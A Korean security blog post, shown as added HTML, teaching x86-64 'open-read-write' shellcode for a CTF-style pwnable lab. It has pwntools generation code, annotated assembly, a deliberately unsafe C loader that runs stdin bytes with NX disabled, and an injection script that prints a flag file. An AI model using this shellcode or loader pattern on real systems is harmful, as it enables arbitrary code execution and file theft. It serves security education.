@@ -1,0 +1,88 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content=3_fDSANQ1lZHsWb4hxyDgILfwMpL33vhlCIi37-BkDM name=google-site-verification><title>
+     orw shellcode
+    
+  </title><meta content="orw shellcode" property=og:title><link href=/icon/favicon.png rel=icon type=image/png><link href=https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.min.css rel=stylesheet><link href=https://cdn.jsdelivr.net/npm/@fontsource/space-grotesk@4.5.8/index.min.css rel=stylesheet><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']]}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link href="https://c0np4nn4.github.io/ atom.xml" rel=alternate title=c0np4nn4 type=application/atom+xml><link href=https://c0np4nn4.github.io/theme/light.css rel=stylesheet><link href=https://c0np4nn4.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://c0np4nn4.github.io/main.css media=screen rel=stylesheet><script src=https://c0np4nn4.github.io/js/feather.min.js></script><body><div class=content><header><div class=main><a href=https://c0np4nn4.github.io/>c0np4nn4</a><div class=socials><a class=social href=https://github.com/c0np4nn4 rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a></nav><nav>| <a href id=dark-mode-toggle onclick=toggleTheme()></a><script src=https://c0np4nn4.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>orw shellcode<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2023-08-30</time></div></div><h1>Table of Contents</h1><ul><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#introduction>Introduction</a><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#code>Code</a> <ul><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#craft-shellcode>craft shellcode</a><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#shellcode-c>shellcode.c</a><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#ex-py>ex.py</a></ul><li><a href=https://c0np4nn4.github.io/posts/orw-shellcode/#result>Result</a></ul><section class=body><h1 id=introduction>Introduction</h1><p><code>shellcode</code>는 특정 동작을 수행하는 <em>바이트 코드</em> 로써, 유저의 입력값을 실행할 수 있는 환경일 때 유용하게 활용될 수 있습니다. 이 포스트에서 살펴볼 <code>shellcode</code>는 <strong>open</strong>, <strong>read</strong>, <strong>write</strong> 를 수행하는 바이트 코드로, 일명 <code>orw shellcode</code> 입니다.<p><code>orw shellcode</code>를 활용하면 아래의 동작을 수행할 수 있습니다.<blockquote><ol><li><p><a href=https://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html>open</a>(path, flag, ...) 함수로 특정 파일을 열고 <em>file descriptor</em> 를 지정할 수 있습니다.</p><li><p><a href=https://man7.org/linux/man-pages/man2/read.2.html>read</a>(fd, buf, count) 함수로 open 된 파일의 값을 읽을 수 있습니다.</p><li><p><a href=https://man7.org/linux/man-pages/man2/write.2.html>write</a>(fd, buf, count) 함수로 읽은 파일의 내용을 특정 위치에 출력할 수 있습니다.</p></ol></blockquote><h1 id=code>Code</h1><h2 id=craft-shellcode>craft shellcode</h2><p><code>shellcode</code>는 <em><strong>pwntools</strong></em> 의 <a href=https://docs.pwntools.com/en/stable/shellcraft.html>shellcraft</a>를 이용하면 아래와 같이 간단히 만들 수 있습니다.<p>단, 여기서는 <code>64-bit</code> 환경임을 상정하고 쉘코드를 만들었습니다. 따라서, <code>context.arch = 'amd64'</code> 코드를 추가하여 이를 명시해주었습니다.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span>
+</span><span>context</span><span style=color:#f29668>.</span><span>arch </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'amd64'
+</span><span>
+</span><span>flag_path </span><span style=color:#f29668>= </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"./flag.txt"
+</span><span>buf </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'rsp'
+</span><span>size </span><span style=color:#f29668>= </span><span style=color:#f29718>0x80
+</span><span>
+</span><span>sc </span><span style=color:#f29668>= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>open</span><span>(flag_path)
+</span><span>sc </span><span style=color:#f29668>+= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>read</span><span>(</span><span style=color:#c2d94c>'rax'</span><span style=color:#bfbab0cc>, </span><span>buf</span><span style=color:#bfbab0cc>, </span><span>size)
+</span><span>sc </span><span style=color:#f29668>+= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>write</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span>buf</span><span style=color:#bfbab0cc>, </span><span>size)
+</span><span style=color:#f07178>print</span><span>(sc)
+</span><span>
+</span><span>shellcode </span><span style=color:#f29668>= </span><span style=color:#ffb454>asm</span><span>(sc)
+</span><span style=color:#f07178>print</span><span>(shellcode)
+</span></code></pre><p>위 코드를 실행했을 때, <code>print(sc)</code>의 결과를 차근차근 살펴보면 아래와 같습니다.<p>유의해야 할 점은 <code>64-bit</code>환경에서의 <strong>systemcall</strong>을 할 때, 인자 순서에 따라 어느 레지스터에 들어가는지를 알고 있어야 한다는 점입니다. 이와 관련해서는 <a href=https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit>syscall table</a> 을 참고하시면 좋습니다.<blockquote><p><em>rdi</em>, <em>rsi</em>, <em>rdx</em>, ... 순서로 저장됨을 확인할 수 있습니다.</blockquote><pre class=language-asm data-lang=asm style=background:#0f1419;color:#bfbab0><code class=language-asm data-lang=asm><span style=color:#ffb454>    /</span><span>* </span><span style=color:#ffb454>open(file=b</span><span style=color:#c2d94c>'./flag.txt'</span><span>, </span><span style=color:#ffb454>oflag=</span><span style=color:#f29718>0</span><span>, </span><span style=color:#ffb454>mode=</span><span style=color:#f29718>0</span><span style=color:#ffb454>) </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    /</span><span>* </span><span style=color:#ff7733>push </span><span style=color:#ffb454>b</span><span style=color:#c2d94c>'./flag.txt\x00' </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>push </span><span style=color:#f29718>0x1010101 </span><span style=color:#ffb454>^ </span><span style=color:#f29718>0x7478
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f07178>dword ptr </span><span>[</span><span style=color:#f29718>rsp</span><span>], </span><span style=color:#f29718>0x1010101
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>rax</span><span>, </span><span style=color:#f29718>0x742e67616c662f2e
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>push </span><span style=color:#f29718>rax
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>rdi</span><span>, </span><span style=color:#f29718>rsp
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f29718>edx</span><span>, </span><span style=color:#f29718>edx </span><span style=color:#ffb454>/</span><span>* </span><span style=color:#f29718>0 </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f29718>esi</span><span>, </span><span style=color:#f29718>esi </span><span style=color:#ffb454>/</span><span>* </span><span style=color:#f29718>0 </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>push </span><span style=color:#ffb454>SYS_open /</span><span>* </span><span style=color:#f29718>2 </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>pop </span><span style=color:#f29718>rax
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>syscall
+</span><span>
+</span><span style=color:#ffb454>    /</span><span>* </span><span style=color:#ffb454>read(</span><span style=color:#c2d94c>'rax'</span><span>, </span><span style=color:#c2d94c>'rsp'</span><span>, </span><span style=color:#f29718>0x80</span><span style=color:#ffb454>) </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>rdi</span><span>, </span><span style=color:#f29718>rax
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f29718>eax</span><span>, </span><span style=color:#f29718>eax </span><span style=color:#ffb454>/</span><span>* </span><span style=color:#ffb454>SYS_read </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f29718>edx</span><span>, </span><span style=color:#f29718>edx
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>dl</span><span>, </span><span style=color:#f29718>0x80
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>rsi</span><span>, </span><span style=color:#f29718>rsp
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>syscall
+</span><span>
+</span><span style=color:#ffb454>    /</span><span>* </span><span style=color:#ffb454>write(fd=</span><span style=color:#f29718>1</span><span>, </span><span style=color:#ffb454>buf=</span><span style=color:#c2d94c>'rsp'</span><span>, </span><span style=color:#ffb454>n=</span><span style=color:#f29718>0x80</span><span style=color:#ffb454>) </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>push </span><span style=color:#f29718>1
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>pop </span><span style=color:#f29718>rdi
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>xor </span><span style=color:#f29718>edx</span><span>, </span><span style=color:#f29718>edx
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>dl</span><span>, </span><span style=color:#f29718>0x80
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>mov </span><span style=color:#f29718>rsi</span><span>, </span><span style=color:#f29718>rsp
+</span><span style=color:#ffb454>    /</span><span>* </span><span style=color:#ff7733>call </span><span style=color:#ffb454>write() </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>push </span><span style=color:#ffb454>SYS_write /</span><span>* </span><span style=color:#f29718>1 </span><span>*</span><span style=color:#ffb454>/
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>pop </span><span style=color:#f29718>rax
+</span><span style=color:#ffb454>    </span><span style=color:#ff7733>syscall
+</span></code></pre><p>위 어셈블리어를 잘 읽어보면 <code>open</code>, <code>read</code>, <code>write</code> 에서 각 레지스터에 적절한 인자값들을 넣어주고 있음을 확인할 수 있습니다.<hr><h2 id=shellcode-c>shellcode.c</h2><p>위 <code>shellcode</code>를 테스트하기 위해 아래와 같이, stdin 으로 입력받은 <em>바이트 코드</em> 를 실행해주는 c언어 코드를 작성합니다.<pre class=language-C data-lang=C style=background:#0f1419;color:#bfbab0><code class=language-C data-lang=C><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdio.h>
+</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTunistd.h>
+</span><span>
+</span><span style=color:#ff7733>int </span><span style=color:#ffb454>main</span><span>() {
+</span><span>  </span><span style=font-style:italic;color:#5c6773>// buffer for storing shellcode
+</span><span>  </span><span style=color:#ff7733>char</span><span> shellcode[] </span><span style=color:#f29668>= </span><span style=color:#c2d94c>""</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> shellcode</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>1024</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=color:#ff7733>void </span><span>(</span><span style=color:#f29668>*</span><span>func)()</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=font-style:italic;color:#5c6773>// type conversion; char[] to function pointer
+</span><span>  func </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>void </span><span>(</span><span style=color:#f29668>*</span><span>)())shellcode</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=font-style:italic;color:#5c6773>// execute shellcode
+</span><span>  </span><span style=color:#ffb454>func</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span></code></pre><p>단, 위 코드를 이용해 코드를 실행하기 위해서는 <code>NX</code> 보호 기법을 해제해줘야 합니다. 따라서, 컴파일 옵션으로 <code>-z execstack</code>을 추가하여 스택 영역에서 코드 실행을 가능하게 해줍니다.<pre class=language-bash data-lang=bash style=background:#0f1419;color:#bfbab0><code class=language-bash data-lang=bash><span style=color:#ffb454>gcc</span><span style=color:#f29718> -o</span><span> shellcode shellcode.c</span><span style=color:#f29718> -z</span><span> execstack
+</span></code></pre><hr><h2 id=ex-py>ex.py</h2><p><em><strong>pwntools</strong></em> 를 이용해 <code>shellcode</code>를 주입하여 <code>orw</code> 를 수행하는 <code>ex.py</code> 코드는 아래와 같습니다.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span>
+</span><span>context</span><span style=color:#f29668>.</span><span>arch </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'amd64'
+</span><span>
+</span><span>flag_path </span><span style=color:#f29668>= </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"./flag.txt"
+</span><span>size </span><span style=color:#f29668>= </span><span style=color:#f29718>0x80
+</span><span>buf </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'rsp'
+</span><span>
+</span><span>sc </span><span style=color:#f29668>= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>open</span><span>(flag_path)
+</span><span>sc </span><span style=color:#f29668>+= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>read</span><span>(</span><span style=color:#c2d94c>'rax'</span><span style=color:#bfbab0cc>, </span><span>buf</span><span style=color:#bfbab0cc>, </span><span>size)
+</span><span>sc </span><span style=color:#f29668>+= </span><span>shellcraft</span><span style=color:#f29668>.</span><span style=color:#ffb454>write</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span>buf</span><span style=color:#bfbab0cc>, </span><span>size)
+</span><span>
+</span><span>shellcode </span><span style=color:#f29668>= </span><span style=color:#ffb454>asm</span><span>(sc)
+</span><span>
+</span><span>p </span><span style=color:#f29668>= </span><span style=color:#ffb454>process</span><span>(</span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"./shellcode"</span><span>)
+</span><span>
+</span><span>p</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(shellcode)
+</span><span style=color:#f07178>print</span><span>(p</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>64</span><span>))
+</span></code></pre><h1 id=result>Result</h1><p>실행화면은 아래와 같습니다.</p><center> <img alt=result src=../../pwnable/orw_shellcode/orw_shellcode_1.png> </center><p><strong>FLAG</strong> 값으로 <code>FLAG{open_read_write_shellcode_this_is_FLAG!}</code> 를 확인할 수 있습니다.</p><script async crossorigin issue-term=pathname label=utterances repo=c0np4nn4/utterance_repo src=https://utteranc.es/client.js theme=github-light></script></section></article></main></div>
